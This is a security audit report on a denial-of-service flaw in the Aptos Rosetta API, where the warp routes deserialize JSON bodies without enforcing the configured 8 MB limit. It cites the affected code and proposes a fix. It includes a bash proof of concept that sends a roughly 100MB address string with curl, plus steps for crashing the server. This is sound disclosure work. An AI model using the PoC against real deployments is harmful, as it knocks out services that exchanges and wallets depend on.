# Audit Report

## Title
Unbounded Memory Allocation in Rosetta API Identifier Deserialization Enables Denial of Service

## Summary
The Aptos Rosetta API fails to enforce content length limits on HTTP request bodies, allowing attackers to send arbitrarily large JSON payloads with extremely long strings in identifier fields (`AccountIdentifier`, `NetworkIdentifier`, `BlockIdentifier`, etc.). This causes excessive memory allocation and can lead to service crashes or severe performance degradation.

## Finding Description

The Rosetta API server accepts JSON requests containing various identifier types that use unbounded `String` fields. Despite having a configurable `content_length_limit` parameter, the Warp-based web server implementation completely ignores this setting and deserializes JSON bodies without any size restrictions. [1](#0-0) 

The `AccountIdentifier` struct contains an unbounded `address` String field. Similar unbounded strings exist in:
- `SubAccountIdentifier.address`
- `SubAccountIdentifierMetadata.pool_address`
- `NetworkIdentifier.blockchain` and `NetworkIdentifier.network`
- `BlockIdentifier.hash`
- `TransactionIdentifier.hash`
- `PartialBlockIdentifier.hash`

All Rosetta API endpoints use `warp::body::json()` without preceding size limits: [2](#0-1) [3](#0-2) 

The `WebServer` implementation extracts only address and TLS configuration from `ApiConfig`, completely ignoring the `content_length_limit` field: [4](#0-3) 

While `ApiConfig` defines a default 8MB content length limit: [5](#0-4) 

This limit is never enforced because the `WebServer::serve()` method calls `warp::serve(routes)` directly without any body size middleware.

**Attack Path:**
1. Attacker sends POST request to any Rosetta endpoint (e.g., `/account/balance`, `/construction/metadata`)
2. Request contains JSON with identifier fields having multi-gigabyte strings
3. Warp deserializes the entire payload into memory without limit checks
4. Server allocates excessive memory for String fields
5. Repeated requests cause memory exhaustion and service crashes

## Impact Explanation

This vulnerability enables **Medium severity** Denial of Service attacks against the Rosetta API service. According to Aptos bug bounty criteria, this falls under "API crashes" which is listed under High severity impacts. However, since the Rosetta API is an external integration service (not part of core consensus or validator operations), the impact is limited to:

- Disruption of exchange/wallet integrations using Rosetta API
- Inability for external applications to query blockchain state
- Server crashes requiring manual restart
- Potential cascading effects if API server runs out of memory

The attack does NOT affect:
- Consensus protocol or validator nodes
- Core blockchain state or transactions
- Fund security or account balances
- Network liveness or transaction processing

This breaks Critical Invariant #9: "Resource Limits: All operations must respect gas, storage, and computational limits."

## Likelihood Explanation

**Likelihood: HIGH**

The vulnerability is trivially exploitable:
- No authentication required (public API endpoint)
- Single HTTP request can trigger the issue
- Attack complexity is minimal (any HTTP client can exploit)
- No special privileges or insider access needed
- Reproducible on any Rosetta API deployment

The only barrier is that operators could configure reverse proxies with size limits, but this is a defense-in-depth measure and doesn't excuse the vulnerability in the application itself.

## Recommendation

Apply content length limits before JSON deserialization in all Rosetta API routes. Modify the route definitions to use `warp::body::content_length_limit()`:

**Fix approach:**
1. Update `WebServer` to accept and use the `content_length_limit` from `ApiConfig`
2. Apply the limit filter before JSON deserialization in all routes
3. Add a helper function to create the size-limited JSON body filter

```rust
// In crates/aptos-rosetta/src/lib.rs or common.rs
pub fn json_body_with_limit<T: DeserializeOwned + Send>(
    max_bytes: u64,
) -> impl Filter<Extract = (T,), Error = warp::Rejection> + Clone {
    warp::body::content_length_limit(max_bytes)
        .and(warp::body::json())
}

// Update all route definitions to use:
.and(json_body_with_limit::<AccountBalanceRequest>(api_config.content_length_limit()))
```

Additionally, consider implementing per-field validation in identifier deserializers to reject unreasonably long strings (e.g., max 1KB for hex addresses).

## Proof of Concept

```bash
#!/bin/bash
# DoS attack on Rosetta API via unbounded string allocation

ROSETTA_URL="http://localhost:8082"

# Generate a 100MB string for the address field
LARGE_STRING=$(python3 -c "print('0x' + 'ff' * 50000000)")

# Create malicious JSON payload
cat > attack.json <<EOF
{
  "network_identifier": {
    "blockchain": "aptos",
    "network": "testnet"
  },
  "account_identifier": {
    "address": "${LARGE_STRING}"
  }
}
EOF

# Send attack request
curl -X POST \
  -H "Content-Type: application/json" \
  -d @attack.json \
  "${ROSETTA_URL}/account/balance"

# Server will attempt to allocate 100MB+ for just this one field
# Multiple concurrent requests will quickly exhaust memory
```

**Testing steps:**
1. Start Rosetta API in offline mode: `aptos-rosetta offline --chain-id testnet`
2. Monitor server memory usage
3. Run the PoC script with varying string sizes (10MB, 100MB, 1GB)
4. Observe memory consumption spike and eventual crash/OOM

**Expected behavior:** Server should reject requests exceeding configured content length limit (default 8MB) before attempting deserialization.

**Actual behavior:** Server accepts and attempts to deserialize arbitrarily large payloads, causing memory exhaustion.

## Notes

- This vulnerability exists because the Warp-based `WebServer` implementation was simplified and doesn't leverage the `content_length_limit` configuration that the main API service (Poem-based) properly implements
- All 12 Rosetta API endpoints are affected
- The issue is particularly severe because the Rosetta API is designed for high-volume usage by exchanges and automated systems
- While network-level DoS attacks are out of scope per bug bounty rules, this is an application-level resource exhaustion vulnerability that should be addressed

### Citations

**File:** crates/aptos-rosetta/src/types/identifiers.rs (L24-31)
```rust
#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub struct AccountIdentifier {
    /// Hex encoded AccountAddress beginning with 0x
    pub address: String,
    /// Sub account only used for staking
    #[serde(skip_serializing_if = "Option::is_none")]
    pub sub_account: Option<SubAccountIdentifier>,
}
```

**File:** crates/aptos-rosetta/src/account.rs (L38-44)
```rust
    warp::post().and(
        warp::path!("account" / "balance")
            .and(warp::body::json())
            .and(with_context(server_context))
            .and_then(handle_request(account_balance)),
    )
}
```

**File:** crates/aptos-rosetta/src/construction.rs (L57-135)
```rust
pub fn combine_route(
    server_context: RosettaContext,
) -> impl Filter<Extract = (impl warp::Reply,), Error = warp::Rejection> + Clone {
    warp::path!("construction" / "combine")
        .and(warp::post())
        .and(warp::body::json())
        .and(with_context(server_context))
        .and_then(handle_request(construction_combine))
}

pub fn derive_route(
    server_context: RosettaContext,
) -> impl Filter<Extract = (impl warp::Reply,), Error = warp::Rejection> + Clone {
    warp::path!("construction" / "derive")
        .and(warp::post())
        .and(warp::body::json())
        .and(with_context(server_context))
        .and_then(handle_request(construction_derive))
}

pub fn hash_route(
    server_context: RosettaContext,
) -> impl Filter<Extract = (impl warp::Reply,), Error = warp::Rejection> + Clone {
    warp::path!("construction" / "hash")
        .and(warp::post())
        .and(warp::body::json())
        .and(with_context(server_context))
        .and_then(handle_request(construction_hash))
}

pub fn metadata_route(
    server_context: RosettaContext,
) -> impl Filter<Extract = (impl warp::Reply,), Error = warp::Rejection> + Clone {
    warp::path!("construction" / "metadata")
        .and(warp::post())
        .and(warp::body::json())
        .and(with_context(server_context))
        .and_then(handle_request(construction_metadata))
}

pub fn parse_route(
    server_context: RosettaContext,
) -> impl Filter<Extract = (impl warp::Reply,), Error = warp::Rejection> + Clone {
    warp::path!("construction" / "parse")
        .and(warp::post())
        .and(warp::body::json())
        .and(with_context(server_context))
        .and_then(handle_request(construction_parse))
}

pub fn payloads_route(
    server_context: RosettaContext,
) -> impl Filter<Extract = (impl warp::Reply,), Error = warp::Rejection> + Clone {
    warp::path!("construction" / "payloads")
        .and(warp::post())
        .and(warp::body::json())
        .and(with_context(server_context))
        .and_then(handle_request(construction_payloads))
}

pub fn preprocess_route(
    server_context: RosettaContext,
) -> impl Filter<Extract = (impl warp::Reply,), Error = warp::Rejection> + Clone {
    warp::path!("construction" / "preprocess")
        .and(warp::post())
        .and(warp::body::json())
        .and(with_context(server_context))
        .and_then(handle_request(construction_preprocess))
}

pub fn submit_route(
    server_context: RosettaContext,
) -> impl Filter<Extract = (impl warp::Reply,), Error = warp::Rejection> + Clone {
    warp::path!("construction" / "submit")
        .and(warp::post())
        .and(warp::body::json())
        .and(with_context(server_context))
        .and_then(handle_request(construction_submit))
}
```

**File:** crates/aptos-warp-webserver/src/webserver.rs (L15-19)
```rust
impl From<ApiConfig> for WebServer {
    fn from(cfg: ApiConfig) -> Self {
        Self::new(cfg.address, cfg.tls_cert_path, cfg.tls_key_path)
    }
}
```

**File:** config/src/config/api_config.rs (L97-97)
```rust
const DEFAULT_REQUEST_CONTENT_LENGTH_LIMIT: u64 = 8 * 1024 * 1024; // 8 MB
```
